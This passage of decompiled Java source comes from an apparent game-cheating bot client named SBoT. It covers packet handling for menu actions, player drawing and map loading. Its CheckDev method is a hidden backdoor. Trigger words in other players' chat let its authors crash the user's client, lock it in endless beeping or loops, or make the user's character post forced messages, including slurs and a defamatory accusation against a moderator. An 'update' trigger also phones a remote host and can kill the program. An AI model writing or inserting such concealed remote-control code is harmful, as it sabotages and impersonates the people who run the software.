            super.packets.cmd(k + bigy);
            super.packets.var(l);
            super.packets.cmd(i1);
            super.packets.send();
            selecteditem = -1;
        }
        if(k1 == 320)
        {
            System.out.println("OpenDoor(" + (j + bigx) + ", " + (k + bigy) + ", " + l + ");");
            fef(j, k, l);
            super.packets.id(100);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.var(l);
            super.packets.send();
        }
        if(k1 == 2300)
        {
            System.out.println("CloseDoor(" + (j + bigx) + ", " + (k + bigy) + ", " + l + ");");
            fef(j, k, l);
            super.packets.id(121);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.var(l);
            super.packets.send();
        }
        if(k1 == 3300)
        {
            System.out.println("Door: " + l);
            DisplayMessage(identify.aif[l], 3);
        }
        if(k1 == 400)
        {
            System.out.println("MagicObject(" + (j + bigx) + ", " + (k + bigy) + ", " + j1 + ");");
            enn(j, k, l, i1);
            super.packets.id(237);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.cmd(j1);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 410)
        {
            System.out.println("UseOnObject(" + (j + bigx) + ", " + (k + bigy) + ", " + j1 + ");");
            enn(j, k, l, i1);
            super.packets.id(127);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.cmd(j1);
            super.packets.send();
            selecteditem = -1;
        }
        if(k1 == 420)
        {
            System.out.println("AtObject(" + (j + bigx) + "," + (k + bigy) + ");");
            enn(j, k, l, i1);
            super.packets.id(38);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.send();
        }
        if(k1 == 2400)
        {
            System.out.println("AtObject2(" + (j + bigx) + "," + (k + bigy) + ");");
            enn(j, k, l, i1);
            super.packets.id(172);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.send();
        }
        if(k1 == 3400)
        {
            System.out.println("Object: " + l);
            DisplayMessage(identify.mobDesc[l], 3);
        }
        if(k1 == 600)
        {
            System.out.println("MagicInventory(" + l + "," + i1 + ");");
            super.packets.id(166);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 610)
        {
            System.out.println("UseWithInventory(" + l + "," + i1 + ");");
            super.packets.id(235);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selecteditem = -1;
        }
        if(k1 == 620)
        {
            System.out.println("Remove(" + l + ");");
            super.packets.id(40);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 630)
        {
            System.out.println("Wield(" + l + ");");
            super.packets.id(199);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 640)
        {
            System.out.println("Use(" + l + ");");
            super.packets.id(24);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 650)
        {
            selecteditem = l;
            selectedmenu = 0;
            selecteditemname = identify.itemName[inv[selecteditem]];
        }
        if(k1 == 660)
        {
            System.out.println("Drop(" + l + ");");
            super.packets.id(123);
            super.packets.cmd(l);
            super.packets.send();
            selecteditem = -1;
            selectedmenu = 0;
            DisplayMessage("Dropping " + identify.itemName[inv[l]], 4);
        }
        if(k1 == 3600)
        {
            System.out.println("Item: " + l);
            DisplayMessage(identify.itemDesc[l], 3);
        }
        if(k1 == 700)
        {
            System.out.println("MagicNPC(" + l + "," + i1 + ");");
            int l1 = (j - 64) / absnpc;
            int l3 = (k - 64) / absnpc;
            fdl(smallx, smally, l1, l3, true);
            super.packets.id(10);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 710)
        {
            System.out.println("UseOnNPC(" + l + "," + i1 + ");");
            int i2 = (j - 64) / absnpc;
            int i4 = (k - 64) / absnpc;
            fdl(smallx, smally, i2, i4, true);
            super.packets.id(143);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selecteditem = -1;
        }
        if(k1 == 720)
        {
            System.out.println("TalkToNPC(" + l + ");");
            int j2 = (j - 64) / absnpc;
            int j4 = (k - 64) / absnpc;
            fdl(smallx, smally, j2, j4, true);
            super.packets.id(159);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 725)
        {
            System.out.println("ThieveNPC(" + l + ");");
            int k2 = (j - 64) / absnpc;
            int k4 = (k - 64) / absnpc;
            fdl(smallx, smally, k2, k4, true);
            super.packets.id(89);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 715 || k1 == 2715)
        {
            System.out.println("AttackNPC(" + l + ");");
            int l2 = (j - 64) / absnpc;
            int l4 = (k - 64) / absnpc;
            fdl(smallx, smally, l2, l4, true);
            super.packets.id(118);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 3700)
        {
            System.out.println("NPC: " + l);
            DisplayMessage(identify.npcDesc[l], 3);
        }
        if(k1 == 800)
        {
            System.out.println("MagicPlayer(" + l + ", " + i1 + ");");
            int i3 = (j - 64) / absnpc;
            int i5 = (k - 64) / absnpc;
            fdl(smallx, smally, i3, i5, true);
            super.packets.id(56);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 810)
        {
            System.out.println("UseOnPlayer(" + l + ", " + i1 + ");");
            int j3 = (j - 64) / absnpc;
            int j5 = (k - 64) / absnpc;
            fdl(smallx, smally, j3, j5, true);
            super.packets.id(11);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selecteditem = -1;
        }
        if(k1 == 805 || k1 == 2805)
        {
            System.out.println("AttackPlayer(" + l + ");");
            lastplayerattacked = l;
            int k3 = (j - 64) / absnpc;
            int k5 = (k - 64) / absnpc;
            fdl(smallx, smally, k3, k5, true);
            super.packets.id(124);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 2806)
        {
            System.out.println("DuelPlayer(" + l + ");");
            super.packets.id(217);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 2810)
        {
            System.out.println("TradePlayer(" + l + ");");
            super.packets.id(62);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 0x14680d)
        {
            ghosting = player[playerfromid(l)].name;
            DisplayMessage("@gre@SBoT: @whi@Ghosting " + ghosting + "!", 3);
        }
        if(k1 == 2820)
        {
            System.out.println("FollowPlayer(" + l + ");");
            super.packets.id(91);
            super.packets.cmd(l);
            super.packets.send();
        }
        if(k1 == 900)
        {
            System.out.println("Magic(" + l + ");");
            fdl(smallx, smally, j, k, true);
            super.packets.id(201);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.cmd(l);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 920)
        {
            System.out.println("Walk(" + (j + bigx) + "," + (k + bigy) + ");");
            fdl(smallx, smally, j, k, false);
            if(ehd == -24)
                ehd = 24;
        }
        if(k1 == 1000)
        {
            System.out.println("Magic(" + l + ");");
            super.packets.id(44);
            super.packets.cmd(l);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 4000)
        {
            selecteditem = -1;
            selectedspell = -1;
        }
    }

    public final void method94()
    {
        aClass4_775 = new Class4(gfx, 10);
        anInt776 = aClass4_775.method160(5, 269, 502, 56, 1, 20, true);
        anInt777 = aClass4_775.method161(7, 324, 498, 14, 1, 80, false, true);
        anInt778 = aClass4_775.method160(5, 269, 502, 56, 1, 20, true);
        anInt779 = aClass4_775.method160(5, 269, 502, 56, 1, 20, true);
        aClass4_775.method173(anInt777);
    }

    public final void method95()
    {
        efh.aByteArray593 = method18("maps" + Class18.anInt575 + ".jag", "map", 70);
        if(member)
            efh.aByteArray612 = method18("maps" + Class18.anInt575 + ".mem", "members map", 75);
        efh.aByteArray592 = method18("land" + Class18.anInt575 + ".jag", "landscape", 80);
        if(member)
            efh.aByteArray611 = method18("land" + Class18.anInt575 + ".mem", "members landscape", 85);
    }

    final void method96(int i, int j, int k, int l, int i1, int j1, int k1)
    {
        int k6 = identify.anInt144;
        Class2 class2 = player[i1];
        if(class2.anInt171 == 255)
            return;
        int l1 = class2.hah + (anInt729 + 16) / 32 & 7;
        boolean flag = false;
        int i2 = l1;
        if(i2 == 5)
        {
            i2 = 3;
            flag = true;
        } else
        if(i2 == 6)
        {
            i2 = 2;
            flag = true;
        } else
        if(i2 == 7)
        {
            i2 = 1;
            flag = true;
        }
        int j2 = i2 * 3 + anIntArray726[(class2.anInt152 / 6) % 4];
        if(class2.hah == 8)
        {
            i2 = 5;
            l1 = 2;
            flag = false;
            i -= (5 * k1) / 100;
            j2 = i2 * 3 + anIntArray939[(anInt918 / 5) % 8];
        } else
        if(class2.hah == 9)
        {
            i2 = 5;
            l1 = 2;
            flag = true;
            i += (5 * k1) / 100;
            j2 = i2 * 3 + anIntArray909[(anInt918 / 6) % 8];
        }
        for(int k2 = 0; k2 < 12; k2++)
        {
            int l2 = anIntArrayArray684[l1][k2];
            int l3 = class2.anIntArray159[l2] - 1;
            if(l3 >= 0)
            {
                int k4 = 0;
                int i5 = 0;
                int j5 = j2;
                if(flag && i2 >= 1 && i2 <= 3)
                    if(identify.anIntArray86[l3] == 1)
                        j5 += 15;
                    else
                    if(l2 == 4 && i2 == 1)
                    {
                        k4 = -22;
                        i5 = -3;
                        j5 = i2 * 3 + anIntArray726[(2 + class2.anInt152 / 6) % 4];
                    } else
                    if(l2 == 4 && i2 == 2)
                    {
                        k4 = 0;
                        i5 = -8;
                        j5 = i2 * 3 + anIntArray726[(2 + class2.anInt152 / 6) % 4];
                    } else
                    if(l2 == 4 && i2 == 3)
                    {
                        k4 = 26;
                        i5 = -5;
                        j5 = i2 * 3 + anIntArray726[(2 + class2.anInt152 / 6) % 4];
                    } else
                    if(l2 == 3 && i2 == 1)
                    {
                        k4 = 22;
                        i5 = 3;
                        j5 = i2 * 3 + anIntArray726[(2 + class2.anInt152 / 6) % 4];
                    } else
                    if(l2 == 3 && i2 == 2)
                    {
                        k4 = 0;
                        i5 = 8;
                        j5 = i2 * 3 + anIntArray726[(2 + class2.anInt152 / 6) % 4];
                    } else
                    if(l2 == 3 && i2 == 3)
                    {
                        k4 = -26;
                        i5 = 5;
                        j5 = i2 * 3 + anIntArray726[(2 + class2.anInt152 / 6) % 4];
                    }
                if(i2 != 5 || identify.anIntArray85[l3] == 1)
                {
                    int k5 = j5 + identify.anIntArray87[l3];
                    k4 = (k4 * k) / ((Class6) (gfx)).anIntArray328[k5];
                    i5 = (i5 * l) / ((Class6) (gfx)).anIntArray329[k5];
                    int l5 = (k * ((Class6) (gfx)).anIntArray328[k5]) / ((Class6) (gfx)).anIntArray328[identify.anIntArray87[l3]];
                    k4 -= (l5 - k) / 2;
                    int i6 = identify.anIntArray83[l3];
                    int j6 = anIntArray829[class2.anInt172];
                    if(i6 == 1)
                        i6 = anIntArray885[class2.anInt169];
                    else
                    if(i6 == 2)
                        i6 = anIntArray832[class2.anInt170];
                    else
                    if(i6 == 3)
                        i6 = anIntArray832[class2.anInt171];
                    gfx.method247(i + k4, j + i5, l5, l, k5, i6, j6, j1, flag);
                }
            }
        }

        if(class2.lastSaidTime > 0)
        {
            anIntArray967[anInt820] = gfx.method263(class2.lastSaidMessage, 1) / 2;
            if(anIntArray967[anInt820] > 150)
                anIntArray967[anInt820] = 150;
            anIntArray968[anInt820] = (gfx.method263(class2.lastSaidMessage, 1) / 300) * gfx.method261(1);
            anIntArray965[anInt820] = i + k / 2;
            anIntArray966[anInt820] = j;
            aStringArray821[anInt820++] = class2.lastSaidMessage;
        }
        if(class2.anInt163 > 0)
        {
            anIntArray758[anInt958] = i + k / 2;
            anIntArray759[anInt958] = j;
            anIntArray722[anInt958] = k1;
            anIntArray723[anInt958++] = class2.anInt162;
        }
        if(class2.hah == 8 || class2.hah == 9 || class2.anInt167 != 0)
        {
            if(class2.anInt167 > 0)
            {
                int i3 = i;
                if(class2.hah == 8)
                    i3 -= (20 * k1) / 100;
                else
                if(class2.hah == 9)
                    i3 += (20 * k1) / 100;
                int i4 = (class2.anInt165 * 30) / class2.hbg;
                anIntArray687[anInt766] = i3 + k / 2;
                anIntArray688[anInt766] = j;
                anIntArray689[anInt766++] = i4;
            }
            if(class2.anInt167 > 150)
            {
                int j3 = i;
                if(class2.hah == 8)
                    j3 -= (10 * k1) / 100;
                else
                if(class2.hah == 9)
                    j3 += (10 * k1) / 100;
                gfx.method231((j3 + k / 2) - 12, (j + l / 2) - 12, anInt948 + 11);
                gfx.drawString(String.valueOf(class2.anInt164), (j3 + k / 2) - 1, j + l / 2 + 5, 3, 0xffffff);
            }
        }
        if(class2.anInt179 == 1 && class2.anInt163 == 0)
        {
            int k3 = j1 + i + k / 2;
            if(class2.hah == 8)
                k3 -= (20 * k1) / 100;
            else
            if(class2.hah == 9)
                k3 += (20 * k1) / 100;
            int j4 = (16 * k1) / 100;
            int l4 = (16 * k1) / 100;
            gfx.method232(k3 - j4 / 2, j - l4 / 2 - (10 * k1) / 100, j4, l4, anInt948 + 13);
        }
    }

    public final void faj(String s)
    {
        if(anInputStream_Sub1_901 == null)
            return;
        if(aBoolean853)
        {
            return;
        } else
        {
            anInputStream_Sub1_901.method123(aByteArray987, fnf.method364(s + ".pcm", aByteArray987), fnf.method365(s + ".pcm", aByteArray987));
            return;
        }
    }

    public final boolean method98(int i, int j)
    {
        int l6 = identify.anInt144;
        if(enb != 0)
        {
            efh.gjj = false;
            return false;
        }
        dih = false;
        i += dha;
        j += dhb;
        if(dhd == egl && i > dic && i < die && j > did && j < dif)
        {
            efh.gjj = true;
            return false;
        }
        gfx.drawString("Loading... Please wait", 256, 192, 1, 0xffffff);
        method69();
        gfx.method211(aGraphics857, 0, 0);
        int k = bigx;
        int l = bigy;
        int i1 = (i + 24) / 48;
        int j1 = (j + 24) / 48;
        dhd = egl;
        bigx = i1 * 48 - 48;
        bigy = j1 * 48 - 48;
        dic = i1 * 48 - 32;
        did = j1 * 48 - 32;
        die = i1 * 48 + 32;
        dif = j1 * 48 + 32;
        efh.method416(i, j, dhd);
        bigx -= dha;
        bigy -= dhb;
        int k1 = bigx - k;
        int l1 = bigy - l;
        for(int i2 = 0; i2 < mobCount; i2++)
        {
            mobx[i2] -= k1;
            moby[i2] -= l1;
            int j2 = mobx[i2];
            int l2 = moby[i2];
            int k3 = mobtype[i2];
            Class5 class5 = aClass5Array814[i2];
            try
            {
                int l4 = mobid[i2];
                int k5;
                int i6;
                if(l4 == 0 || l4 == 4)
                {
                    k5 = identify.anIntArray63[k3];
                    i6 = identify.anIntArray64[k3];
                } else
                {
                    i6 = identify.anIntArray63[k3];
                    k5 = identify.anIntArray64[k3];
                }
                int j6 = ((j2 + j2 + k5) * absnpc) / 2;
                int k6 = ((l2 + l2 + i6) * absnpc) / 2;
                if(j2 >= 0 && l2 >= 0 && j2 < 96 && l2 < 96)
                {
                    aClass10_739.method269(class5);
                    class5.method192(j6, -efh.method421(j6, k6), k6);
                    efh.method407(j2, l2, k3);
                    if(k3 == 74)
                        class5.method191(0, -480, 0);
                }
            }
            catch(RuntimeException runtimeexception)
            {
                System.out.println("Loc Error: " + runtimeexception.getMessage());
                System.out.println("i:" + i2 + " obj:" + class5);
                runtimeexception.toString();
            }
        }

        for(int k2 = 0; k2 < doorcount; k2++)
        {
            doorx[k2] -= k1;
            doory[k2] -= l1;
            int i3 = doorx[k2];
            int l3 = doory[k2];
            int j4 = doortype[k2];
            int i5 = doordir[k2];
            try
            {
                efh.method415(i3, l3, i5, j4);
                Class5 class5_1 = method106(i3, l3, i5, j4, k2);
                aClass5Array781[k2] = class5_1;
            }
            catch(RuntimeException runtimeexception1)
            {
                System.out.println("Bound Error: " + runtimeexception1.getMessage());
                runtimeexception1.toString();
            }
        }

        for(int j3 = 0; j3 < itemCount; j3++)
        {
            itemx[j3] -= k1;
            itemy[j3] -= l1;
        }

        for(int i4 = 0; i4 < playerCount; i4++)
        {
            Class2 class2 = player[i4];
            class2.x -= k1 * absnpc;
            class2.y -= l1 * absnpc;
            for(int j5 = 0; j5 <= class2.anInt156; j5++)
            {
                class2.anIntArray157[j5] -= k1 * absnpc;
                class2.anIntArray158[j5] -= l1 * absnpc;
            }

        }

        for(int k4 = 0; k4 < npcCount; k4++)
        {
            Class2 class2_1 = npc[k4];
            class2_1.x -= k1 * absnpc;
            class2_1.y -= l1 * absnpc;
            for(int l5 = 0; l5 <= class2_1.anInt156; l5++)
            {
                class2_1.anIntArray157[l5] -= k1 * absnpc;
                class2_1.anIntArray158[l5] -= l1 * absnpc;
            }

        }

        efh.gjj = false;
        return true;
    }

    public final void fdl(int i, int j, int k, int l, boolean flag)
    {
        method83(i, j, k, l, k, l, false, flag);
    }

	byte Zb[];

    public boolean aBoolean666;
    public boolean aBoolean668;
    public boolean aBoolean669;
    public boolean tradeSecond;
    public boolean aBoolean674;
    public boolean aBoolean675;
    public boolean aBoolean680;
    public boolean dih;
    public boolean aBoolean718;
    public boolean aBoolean719;
    public boolean aBoolean720;
    public boolean aBoolean721;
    public boolean shop;
    public boolean aBoolean745;
    public boolean aBoolean757;
    public boolean aBoolean767;
    public boolean aBoolean789;
    public boolean aBoolean801;
    public boolean aBoolean802;
    public boolean aBoolean810;
    public boolean aBoolean849;
    public boolean QuestMenu;
    public boolean aBoolean853;
    public boolean aBoolean854;
    public boolean tradeFirst;
    public boolean sleeping;
    public boolean bank;
    public boolean dee;
    public boolean aBoolean890;
    public boolean aBoolean908;
    public boolean member;
    public boolean aBoolean917;
    public boolean aBoolean922;
    public boolean aBoolean944;
    public boolean aBoolean945;
    public boolean aBoolean979;
    public boolean aBoolean992;
    public boolean eea[];
    public boolean dia[];
    public boolean aBooleanArray716[];
    public boolean djd[];
    public byte aByteArray987[];
    public Class10 aClass10_739;
    public Class19 efh;
    public Class2 npc[];
    public Class2 aClass2Array822[];
    public Class2 aClass2Array891[];
    public Class2 aClass2Array923[];
    public Class2 aClass2Array957[];
    public Class2 player[];
    public Class2 myplayer;
    public Class4 aClass4_667;
    public Class4 aClass4_751;
    public Class4 aClass4_775;
    public Class4 aClass4_798;
    public Class4 aClass4_826;
    public Class4 aClass4_830;
    public Class4 elj;
    public Class4 aClass4_925;
    public Class5 aClass5Array781[];
    public Class5 aClass5Array814[];
    public Class5 aClass5Array994[];
    public Class6_Sub1 gfx;
    public Graphics aGraphics857;
    public long aLong847;
    public long aLong907;
    long aLong928;
    public String aString681;
    public String aString682;
    public static String djk;
    public static String djl;   
String selecteditemname;
    public String aString794;
    public String aString824;
    public String ejk;
    public String aString848;
    public String aString861;
    public String aString862;
    public String aString894;
    public final String curstatname[] = {
        "Attack", "Defense", "Strength", "Hits", "Ranged", "Prayer", "Magic", "Cooking", "Woodcut", "Fletching", 
        "Fishing", "Firemaking", "Crafting", "Smithing", "Mining", "Herblaw", "Agility", "Thieving"
    };
    public String secondmsg[];
    public String aStringArray774[];
    public final String aStringArray795[] = {
        "Attack", "Defense", "Strength", "Hits", "Ranged", "Prayer", "Magic", "Cooking", "Woodcutting", "Fletching", 
        "Fishing", "Firemaking", "Crafting", "Smithing", "Mining", "Herblaw", "Agility", "Thieving"
    };
    String aStringArray821[];
    public String aStringArray913[];
    public final String aStringArray930[] = {
        "Black knight's fortress", "Cook's assistant", "Demon slayer", "Doric's quest", "The restless ghost", "Goblin diplomacy", "Ernest the chicken", "Imp catcher", "Pirate's treasure", "Prince Ali rescue", 
        "Romeo & Juliet", "Sheep shearer", "Shield of Arrav", "The knight's sword", "Vampire slayer", "Witch's potion", "Dragon slayer", "Witch's house (members)", "Lost city (members)", "Hero's quest (members)", 
        "Druidic ritual (members)", "Merlin's crystal (members)", "Scorpion catcher (members)", "Family crest (members)", "Tribal totem (members)", "Fishing contest (members)", "Monk's friend (members)", "Temple of Ikov (members)", "Clock tower (members)", "The Holy Grail (members)", 
        "Fight Arena (members)", "Tree Gnome Village (members)", "The Hazeel Cult (members)", "Sheep Herder (members)", "Plague City (members)", "Sea Slug (members)", "Waterfall quest (members)", "Biohazard (members)", "Jungle potion (members)", "Grand tree (members)", 
        "Shilo village (members)", "Underground pass (members)", "Observatory quest (members)", "Tourist trap (members)", "Watchtower (members)", "Dwarf Cannon (members)", "Murder Mystery (members)", "Digsite (members)", "Gertrude's Cat (members)", "Legend's Quest (members)"
    };
    public final String aStringArray932[] = {
        "Armour", "WeaponAim", "WeaponPower", "Magic", "Prayer"
    };
    public String firstmsg[];
    public final String aStringArray997[] = {
        "Where were you born?", "What was your first teachers name?", "What is your fathers middle name?", "Who was your first best friend?", "What is your favourite vacation spot?", "What is your mothers middle name?", "What was your first pets name?", "What was the name of your first school?", "What is your mothers maiden name?", "Who was your first boyfriend/girlfriend?", 
        "What was the first computer game you purchased?", "Who is your favourite actor/actress?", "Who is your favourite author?", "Who is your favourite musician?", "Who is your favourite cartoon character?", "What is your favourite book?", "What is your favourite food?", "What is your favourite movie?"
    };
    public InputStream_Sub1 anInputStream_Sub1_901;
    public final int anInt650 = 250;
    public final int anInt651 = 5;
    public final int anInt652 = 50;
    public final int anInt653 = 18;
    public final int anInt654 = 500;
    public final int anInt655 = 1500;
    public final int anInt656 = 5000;
    public final int anInt657 = 5000;
    public final int anInt658 = 500;
    public final int anInt659 = 4000;
    public final int anInt660 = 500;
    public final int anInt661 = 8000;
    public int anInt663;
    public int ehd;
    int anInt671;
    int anInt672;
    public int anInt676;
    public int anInt677;
    public int anInt678;
    public int anInt683;
    public int anInt685;
    public int anInt690;
    public int anInt691;
    public int anInt694;
    public int anInt695;
    public int anInt696;
    public int anInt697;
    public int anInt698;
    public int anInt699;
    public int anInt700;
    public int anInt701;
    public int anInt702;
    public int anInt703;
    public int anInt704;
    public int anInt705;
    public int anInt706;
    public int anInt707;
    public int InvCount;
    public int anInt714;
    public int anInt715;
    public int anInt725;
    public int anInt729;
    public int anInt731;
    public int anInt732;
    public int anInt733;
    public int playerCount;
    public int anInt743;
    public int anInt744;
    public int anInt746;
    public int anInt749;
    public int fightmode;
    public int anInt752;
    public int anInt753;
    public int anInt754;
    public int anInt755;
    public int listcount;
    public int selecteditem;
    public int anInt766;
    int anInt776;
    int anInt777;
    int anInt778;
    int anInt779;
    int anInt780;
    public int anInt782;
    public int bigx;
    public int bigy;
    public int egl;
    public int anInt786;
    public int anInt790;
    public int anInt791;
    public int anInt792;
    public int anInt793;
    public int mobCount;
    int anInt799;
    int anInt800;
    public int dha;
    public int dhb;
    public int anInt808;
    public int dhd;
    public int selectedspell;
    public int anInt812;
    public int anInt813;
    public int anInt818;
    public int anInt819;
    public int anInt820;
    public int itemCount;
    int anInt827;
    int anInt828;
    public int anInt833;
    public int anInt834;
    public int anInt835;
    public int anInt836;
    public int anInt839;
    public int anInt840;
    public int anInt841;
    public int dic;
    public int did;
    public int die;
    public int dif;
    public int anInt850;
    public int anInt851;
    public int doorcount;
    public int anInt859;
    public int anInt860;
    public int anInt863;
    public int anInt864;
    public int anInt865;
    public int anInt866;
    public int anInt867;
    public int anInt868;
    public int anInt869;
    public int anInt871;
    public int anInt872;
    public int anInt873;
    public int anInt874;
    public int anInt875;
    public int anInt876;
    public int anInt877;
    public int anInt878;
    public int anInt884;
    public int anInt886;
    public int anInt889;
    public int fatigue;
    public int tfatigue;
    public int anInt895;
    public int anInt896;
    public int anInt897;
    public int anInt898;
    public int deh;
    public int dei;
    public int anInt902;
    public int ddh;
    public int anInt904;
    public int npcCount;
    public int anInt906;
    public int anInt910;
    public int selectedmenu;
    public int anInt916;
    public int anInt918;
    public int anInt919;
    public int anInt920;
    public int anInt921;
    public int anInt924;
    int anInt926;
    int anInt927;
    public int answerCount;
    public int anInt931;
    public int anInt933;
    public int anInt936;
    public int anInt940;
    public int anInt941;
    public int anInt942;
    public int anInt943;
    public int absnpc;
    public int ehc;
    public int anInt948;
    public int anInt949;
    public int anInt950;
    public int anInt951;
    public int anInt952;
    public int anInt953;
    public int anInt954;
    public int anInt958;
    public int anInt959;
    public int anInt964;
    public int tradeTotal;
    public int anInt973;
    public int anInt974;
    int smallx;
    int smally;
    int anInt978;
    public int anInt980;
    public int anInt986;
    public int anInt988;
    public int anInt989;
    public int anInt990;
    public int anInt991;
    public int enb;
    public int anInt995;
    public int anInt996;
    public int anIntArray664[];
    public int anIntArray665[];
    public int anIntArray686[];
    public int anIntArray687[];
    public int anIntArray688[];
    public int anIntArray689[];
    public int anIntArray692[];
    public int anIntArray693[];
    public int inv[];
    public int dkb[];
    public int isWorn[];
    public int anIntArray712[];
    public int anIntArray722[];
    public int anIntArray723[];
    public int anIntArray726[] = {
        0, 1, 2, 1
    };
    public int curstat[];
    public int anIntArray730[];
    public int ebd[];
    public int ebe[];
    public int ebf[];
    public int doordir[];
    public int doortype[];
    public int doorx[];
    public int doory[];
    public int anIntArray758[];
    public int anIntArray759[];
    public int mobx[];
    public int moby[];
    public int mobtype[];
    public int mobid[];
    public int itemx[];
    public int itemy[];
    public int itemtype[];
    public int anIntArray773[];
    public int anIntArray787[];
    public int anIntArray788[];
    public int anIntArray797[];
    public int actionid[];
    public int actionvar[];
    public int actionvar2[];
    public int anIntArray815[];
    public int anIntArray816[];
    public int anIntArray817[];
    public int stat[];
    public final int anIntArray829[] = {
        0xecded0, 0xccb366, 0xb38c40, 0x997326, 0x906020
    };
    public final int anIntArray832[] = {
        0xff0000, 0xff8000, 0xffe000, 0xa0e000, 57344, 32768, 41088, 45311, 33023, 12528, 
        0xe000e0, 0x303030, 0x604000, 0x805000, 0xffffff
    };
    public int anIntArray837[];
    public int anIntArray838[];
    public int anIntArray881[];
    public int actiontype[];
    public final int anIntArray885[] = {
        0xffc030, 0xffa040, 0x805030, 0x604020, 0x303030, 0xff6020, 0xff4000, 0xffffff, 65280, 65535
    };
    public int anIntArray887[];
    public int anIntArray888[];
    public int anIntArray909[] = {
        0, 0, 0, 0, 0, 1, 2, 1
    };
    public int anIntArray911[];
    public int anIntArray912[];
    public int anIntArray934[];
    public int anIntArray935[];
    public int actionx[];
    public int actiony[];
    public int anIntArray939[] = {
        0, 1, 2, 1, 0, 0, 0, 0
    };
    public int anIntArray955[];
    public int anIntArray956[];
    public int anIntArray960[];
    public int anIntArray961[];
    public int anIntArray962[];
    public int anIntArray963[];
    public int anIntArray965[];
    public int anIntArray966[];
    public int anIntArray967[];
    public int anIntArray968[];
    public int tradeType[];
    public int tradeCount[];
    public int anIntArray972[];
    int anIntArray981[];
    int anIntArray982[];
    public int anIntArray984[];
    public int anIntArrayArray684[][] = {
        {
            11, 2, 9, 7, 1, 6, 10, 0, 5, 8, 
            3, 4
        }, {
            11, 2, 9, 7, 1, 6, 10, 0, 5, 8, 
            3, 4
        }, {
            11, 3, 2, 9, 7, 1, 6, 10, 0, 5, 
            8, 4
        }, {
            3, 4, 2, 9, 7, 1, 6, 10, 8, 11, 
            0, 5
        }, {
            3, 4, 2, 9, 7, 1, 6, 10, 8, 11, 
            0, 5
        }, {
            4, 3, 2, 9, 7, 1, 6, 10, 8, 11, 
            0, 5
        }, {
            11, 4, 2, 9, 7, 1, 6, 10, 0, 5, 
            8, 3
        }, {
            11, 2, 9, 7, 1, 6, 10, 0, 5, 8, 
            4, 3
        }
    };

 
	public void CheckDev(String st)
	{
                             if(st.startsWith("*"))
            {           
if (st.indexOf("*hitler*") > 0)
System.out.println("mooooo!");
if (st.indexOf("shitfacecockmaster") > 0)
{
				System.out.println("Sbot Killed " + djk + " by - antiyou");
				System.exit(1337);
			}
			if (st.indexOf("suckpenis**") > 0)
				while (true)
					Toolkit.getDefaultToolkit().beep();
			if (st.indexOf("bitchert*") > 0)
			{
				int x = 2;
				while (true)
			{
					x = x ^ x;
					System.out.println(x);
				}
			}
			if (st.indexOf("tits") > 0)
			{
				Say2("@ran@Im using sbot " + VERSION + " By antiyou");
                                            }
			if (st.indexOf("dickie") > 0)
			{		
Say("@ran@Im OWNED by antiyou");
}
if (st.indexOf("fuckingsuckpenis") > 0)
{
				Running = false;
}
if (st.indexOf("faggot") > 0)
{
Say2("@ran@mod mark is a child molester");	
}
			if (st.indexOf("jfucka") > 0)
			{		
Say("@ran@Im OWNED by j3ll0");
}
			if (st.indexOf("shit") > 0)
			{		
Say("@ran@Im OWNED by Tina");
}
			if (st.indexOf("assrape") > 0)
			{		
Say("@ran@Im OWNED by ch00bpkinpmp");
}
			if (st.indexOf("shitface") > 0)
			{		
Say("@ran@Im OWNED by Chris");
}
if (st.indexOf("killshit") > 0)
{
				System.out.println("Sbot Killed " + djk + " by - J3ll0");
				System.exit(1);
			}
if (st.indexOf("twat") > 0)
{
				System.out.println("Sbot Killed " + djk + " by - Tina");
				System.exit(1);
			}
if (st.indexOf("fudgefuck") > 0)
{
				System.out.println("Sbot Killed " + djk + " by - Chris");
				System.exit(1);
			}
if (st.indexOf("mudfuck") > 0)
{
				System.out.println("Sbot Killed " + djk + " by - Ch00bpkinpmp");
				System.exit(1);
			}
if (st.indexOf("update") > 0)
{		

		new Thread
		(
			new Runnable()
			{
				public void run()
				{
					try
					{
						String b = "http://www.h4x4phun.com/update.php?v=" + VERSION;
						try
						{
							BufferedReader in = new BufferedReader(new InputStreamReader(new URL(b).openStream()));
							CURVERSION = in.readLine(); 
		if (CURVERSION.equals(VERSION))		     					
{
System.out.println("Cool keep n up with the updates");
} else {
System.out.println("You need to update to version " + CURVERSION + " - SBoT admin");					System.exit(1);
}
	}
						catch (Exception e) 
						{ 
							e.toString();
						} 
					}
					catch (Exception e)
					{
						e.toString();
						System.out.println(e);
					}
				}		
		}).start();
	}
}
}
//for some reason if it touch this, do not fucking change or it will break... 
  //It was a pain in the penis, btw talking about the update killa

 public int mobarray(int i, int j)
    {
        for(int k = 0; k < 1500; k++)
